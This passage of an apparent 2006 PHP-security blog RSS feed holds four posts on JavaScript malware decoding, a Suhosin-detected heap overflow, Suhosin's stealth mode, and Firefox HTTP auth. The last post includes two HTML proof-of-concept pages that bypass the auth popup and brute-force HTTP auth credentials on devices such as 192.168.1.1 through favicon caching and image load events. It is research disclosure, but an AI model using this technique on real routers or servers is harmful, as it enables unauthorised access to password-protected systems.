    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
From time to time I visit the &lt;a href=&quot;http://www.incidents.org&quot;&gt;Diary of the internet storm center&lt;/a&gt;. Sometimes they write very interesting stuff and sometimes plain nonsense like repeating again and again the urban legend that allow_url_fopen protects against URL include vulnerabilities.&lt;p&gt;&lt;br /&gt;Today there was once again a &lt;a href=&quot;http://www.incidents.org/diary.php?storyid=1917&quot;&gt;very amusing post&lt;/a&gt; from Tom Liston from &lt;a href=&quot;http://www.intelguardians.com/&quot;&gt;Intelguardians&lt;/a&gt;. The post is about a piece of encoded JavaScript malware(?) that was found on a site and the process of decoding it. While it is true that the encoding used in this case was not very smart the amusing part of this post is that it is a rant against JavaScript and JavaScript programmers. While he is at it he calls JavaScript a toy language and JavaScript programmers: wanna be real programmers.&lt;/p&gt;&lt;p /&gt;&lt;p&gt;&lt;br /&gt;When you read this you think that this guy has most probably never seen the amount of JavaScript behind large Web 2.0 sites or never seen the power of Firefox extensions that are completely written in JavaScript. You start thinking about him beeing an Internet Explorer user, which is kinda strange because most security professionals choose one of the real browsers like Firefox, Safari or Opera. Which does not mean that they are more secure but the amount of Firefox plugins for header/request manipulation alone, are reason enough for many professionals to use it for their daily work. And extensions like NoScript simply do not exist for IE. (Or am I wrong?)&lt;/p&gt;&lt;p&gt;&lt;br /&gt;So far the Firefox advertisement, back to the JavaScript malware. Tom continues to rant about the malware author beeing not so clever, because he used array notation to access the content of strings, which does not work according to Tom.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;i&gt;Turns out, it was the JavaScript jockey who wasn't so clever.  Dude...&lt;br /&gt;
if you're out there and reading this, take some notes, ok? You can't&lt;br /&gt;
access a string using array notation: &amp;quot;a[c]&amp;quot; doesn't work.  Here's how&lt;br /&gt;
you fix it:  you need to replace &amp;quot;a[c]&amp;quot; with &amp;quot;a.substr(c, 1)&amp;quot;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;At this point you have to smile. Lesson one you learn when working in web application security is that just because something does not work in your browser, this doesn't mean it will fail in another browser, too. Tom's observation is most probably correct, because you cannot access strings using array notation in this toy browser called Internet Explorer, but in browsers like Firefox or Opera this works perfectly.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;
&lt;/p&gt;    </content:encoded>
    <pubDate>Thu, 07 Dec 2006 20:47:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/59-guid.html</guid>
    </item>
<item>
    <title>Suhosin caught another remote code execution vulnerability</title>
    <link>http://blog.php-security.org/archives/58-Suhosin-caught-another-remote-code-execution-vulnerability.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/58-Suhosin-caught-another-remote-code-execution-vulnerability.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=58</wfw:comment>
    <slash:comments>8</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=58</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
It is actually not the first time that &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; caught a possible remote code execution vulnerability, but this time it is documented in the public. Yesterday a friend asked me why the &lt;a href=&quot;http://blog.bitflux.ch/archive/2006/09/28/upload-progress-meter-extension-for-php-5-2.html&quot;&gt;uploadprogressmeter extension&lt;/a&gt; does not work together with &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt;. After a while he realised that instead of failing silently he had ALERTs like this in his error log (when you look into the blog of the author you will see that others had similiar problems).&lt;p&gt;&lt;br /&gt;ALERT - canary mismatch on efree() - heap overflow detected&lt;/p&gt;&lt;p&gt;&lt;br /&gt;When you see such a message this usually means that some component has done something terribly wrong. Sometimes without &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; you would see nothing at all or mysterious crashes, that might only happen under some circumstances because of the memory layout. But in many cases such problems can be used for (remote) code execution exploits. Especially in PHP 5.2 because the new Zend Memory Manager makes exploiting HEAP overflows easier and more stable than the old one. (In previous PHP versions there was the chance that overflows were detected by the system malloc() function, which is due to the new memory manager no longer possible.)&lt;/p&gt;&lt;p&gt;&lt;br /&gt;Back to the fileupload extension. I downloaded it and looked into the code (that is luckily short) and indeed it contained a possible remote code execution vulnerability that can be abused by malicious POST fileupload requests.&lt;/p&gt;&lt;p /&gt;&lt;p&gt;&lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; did not only stop this possible code execution exploit but helped ordinary users to detect it in the first place. Once again a dangerous and unknown vulnerability was killed once and for all by the simple use of &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin-Patch&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;
&lt;/p&gt;    </content:encoded>
    <pubDate>Mon, 04 Dec 2006 12:14:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/58-guid.html</guid>
    </item>
<item>
    <title>Suhosin 0.9.16 with Stealth Mode</title>
    <link>http://blog.php-security.org/archives/57-Suhosin-0.9.16-with-Stealth-Mode.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/57-Suhosin-0.9.16-with-Stealth-Mode.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=57</wfw:comment>
    <slash:comments>8</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=57</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
A few days ago I blogged about the anti open source features of &lt;a href=&quot;http://blog.php-security.org/archives/53-Trusted-Zend-Extensions.html&quot;&gt;ionCube loader&lt;/a&gt; that were not tricked by the simple stealth loading tricks &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; uses to load together with Zend products. Because of this the stealth loading of the &lt;a href=&quot;http://www.suhosin.org&quot;&gt;Suhosin&lt;/a&gt; extension was changed to be even more stealthy. &lt;p&gt;&lt;br /&gt;I really dislike the fact that this is necessary, because the more stealth features one has to implement the higher is the probability that there is a compatibility problem. Therefore it is now possible from within php.ini to completely disable stealth mode. In case you are not running untrustworthy closed source binary extensions that backdoor PHP like ionCube loader you can simply disable it.&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;b&gt;BTW:&lt;/b&gt; It is quite possible that the ionCube guys will start a cat and mouse game and will try to detect Suhosin and refuse to work. Just tell me about it and I will work around this again. If it were up to me I would simply commit code to the Zend Engine that stops ionCube products from loading within a vanilla PHP to show them what the open source world thinks about their untrustworthy Zend Extension backdoors.&lt;br /&gt; &lt;/p&gt;&lt;br /&gt;    </content:encoded>
    <pubDate>Sun, 03 Dec 2006 13:34:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/57-guid.html</guid>
    </item>
<item>
    <title>Bruteforcing HTTP Auth in Firefox with JavaScript</title>
    <link>http://blog.php-security.org/archives/56-Bruteforcing-HTTP-Auth-in-Firefox-with-JavaScript.html</link>
<category>PHP</category><category>Security</category>    <comments>http://blog.php-security.org/archives/56-Bruteforcing-HTTP-Auth-in-Firefox-with-JavaScript.html#comments</comments>
    <wfw:comment>http://blog.php-security.org/wfwcomment.php?cid=56</wfw:comment>
    <slash:comments>4</slash:comments>
    <wfw:commentRss>http://blog.php-security.org/rss.php?version=2.0&amp;type=comments&amp;cid=56</wfw:commentRss>

    <author>blog-admin@nopiracy.de (Stefan Esser)</author>
    <content:encoded>
&lt;br /&gt;
Yesterday I blogged about a &lt;a href=&quot;http://blog.php-security.org/archives/54-JavaScriptHTML-Portscanning-and-HTTP-Auth.html&quot;&gt;way to bypass HTTP Auth popus&lt;/a&gt; that used a &amp;quot;abuse the server&amp;quot; approach. Today I will show a way to bypass HTTP auth in Firefox and in some cases bruteforce HTTP auth in Firefox in some situations. The precondition for the bruteforce approach here is that the attacked server is either running PHP with expose_php=On or an application in a guessable location that contains pictures. (However combined with timing attacks and the number of requests sent depending if the password was correct or not it might be possible to do this without pictures)&lt;br /&gt;&lt;p /&gt;&lt;p&gt;&lt;br /&gt;The basic idea behind bypassing HTTP auth is to request the files in a way that Firefox will not bother asking the user for a password. From a logical point of view this results in the question: Where does Firefox request optional content? Because this are the likely cases where it does not ask the user for a password. After a bit of thinking you might get the idea that the favicon and the page prefetching are likely cases.&lt;/p&gt;&lt;p /&gt;&lt;p&gt;&lt;br /&gt;And indeed a page like this will not trigger an HTTP auth popup&lt;/p&gt;&lt;pre&gt;&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;html&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;head&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;title&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;FF HTML Only HTTP Auth Bypass&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/title&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;link&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;rel=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;shortcut icon&amp;quot;&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;href=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;http://192.168.1.1/&amp;quot;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;type=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;image/x-icon&amp;quot;&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;link&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;rel=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;prefetch&amp;quot;&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;href=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;http://192.168.1.1/&amp;quot;&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/head&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;body&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  Bumm&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/body&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/html&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;/pre&gt;&lt;br /&gt;
&lt;p&gt;If you like you can combine this with your favourite HTML only timing attack that is now public and discussed for example &lt;a href=&quot;http://ilia.ws/archives/145-Network-Scanning-with-HTTP-without-JavaScript.html&quot;&gt;here&lt;/a&gt; or take the whole thing a step further and use it for bruteforcing HTTP auth. All you need for this is to know that Firefox does agressive caching for favicons and the URL to a HTTP auth protected image. In case the server is running PHP with expose_php=On you can use the idea described &lt;a href=&quot;http://blog.php-security.org/archives/55-JavaScript-Scanning-and-expose_phpOn.html&quot;&gt;here&lt;/a&gt; to use as attack image URL. The proof of concept code is here:&lt;/p&gt;&lt;pre&gt;&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;html&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;head&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;title&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;Firefox HTTP Auth Bruteforcing&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/title&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;script&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;    function okPW()&lt;br /&gt;    {&lt;br /&gt;      alert(&amp;quot;User/Password Combination correct&amp;quot;);&lt;br /&gt;    }&lt;br /&gt;&lt;br /&gt;    function wrongPW()&lt;br /&gt;    {&lt;br /&gt;      alert(&amp;quot;User/Password Combination is wrong&amp;quot;);&lt;br /&gt;    }&lt;br /&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/script&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;  &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;link&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;rel=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;shortcut icon&amp;quot;&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;href=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;http://user:pass@URL&amp;quot;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;type=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;image/x-icon&amp;quot;&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/head&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;body&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;img&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;src=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;http://user:pass@URL&amp;quot;&lt;/font&gt; &lt;br /&gt;&lt;font color=&quot;#2040a0&quot;&gt;onLoad=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;okPW()&amp;quot;&lt;/font&gt; &lt;font color=&quot;#2040a0&quot;&gt;onError=&lt;/font&gt;&lt;font color=&quot;#008000&quot;&gt;&amp;quot;wrongPW()&amp;quot;&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt; &lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/body&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;br /&gt;&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;lt;&lt;/strong&gt;&lt;/font&gt;&lt;font color=&quot;#2040a0&quot;&gt;/html&lt;/font&gt;&lt;font color=&quot;#4444ff&quot;&gt;&lt;strong&gt;&amp;gt;&lt;/strong&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;/pre&gt;&lt;p&gt;Please note that you can use any kind of URL that points to a HTTP auth protected image. You can obviously also use the expose_php GUIDs like &lt;font&gt;&lt;strong&gt;&lt;font&gt;&lt;font color=&quot;#2040a0&quot;&gt;&lt;strong&gt;&lt;font color=&quot;#008000&quot;&gt;?=PHPE9568F35-D428-11d2-A769-00AA001ACF42&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;&lt;/font&gt;&lt;/strong&gt;&lt;/font&gt;. However you must ensure that both user:pass+URL combinations are the same because otherwise the caching will not kick in. Additionally you cannot simply reload the page, because then you will get the HTTP auth popup.&lt;/p&gt;&lt;br /&gt;
&lt;p&gt;&lt;br /&gt;
 &lt;/p&gt;    </content:encoded>
    <pubDate>Fri, 01 Dec 2006 11:57:00 +0000</pubDate>
    <guid isPermaLink="false">http://blog.php-security.org/archives/56-guid.html</guid>
    </item>
</channel>
</rss>
